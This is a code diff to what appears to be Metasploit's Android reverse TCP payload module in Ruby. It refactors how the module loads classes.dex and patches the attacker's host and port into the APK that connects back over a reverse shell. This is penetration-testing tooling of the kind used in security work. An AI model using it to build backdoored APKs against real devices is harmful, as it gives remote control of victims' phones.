@@ -26,21 +26,21 @@ module Metasploit3
       'Handler'		=> Msf::Handler::ReverseTcp,
       'Stager'		=> {'Payload' => ""}
     ))
+  end
 
-    register_options(
-    [
-      OptInt.new('RetryCount', [true, "Number of trials to be made if connection failed", 10])
-    ], self.class)
+  def include_send_uuid
+      false
   end
 
   def generate_jar(opts={})
     jar = Rex::Zip::Jar.new
 
-    classes = File.read(File.join(Msf::Config::InstallRoot, 'data', 'android', 'apk', 'classes.dex'), {:mode => 'rb'})
+    classes = MetasploitPayloads.read('android', 'apk', 'classes.dex')
 
     string_sub(classes, 'XXXX127.0.0.1                       ', "XXXX" + datastore['LHOST'].to_s) if datastore['LHOST']
     string_sub(classes, 'YYYY4444                            ', "YYYY" + datastore['LPORT'].to_s) if datastore['LPORT']
-    string_sub(classes, 'TTTT                                ', "TTTT" + datastore['RetryCount'].to_s) if datastore['RetryCount']
+    apply_options(classes)
+
     jar.add_file("classes.dex", fix_dex_header(classes))
 
     files = [
@@ -48,7 +48,7 @@ module Metasploit3
       [ "resources.arsc" ]
     ]
 
-    jar.add_files(files, File.join(Msf::Config.data_directory, "android", "apk"))
+    jar.add_files(files, MetasploitPayloads.path("android", "apk"))
     jar.build_manifest
 
     cert, key = generate_cert
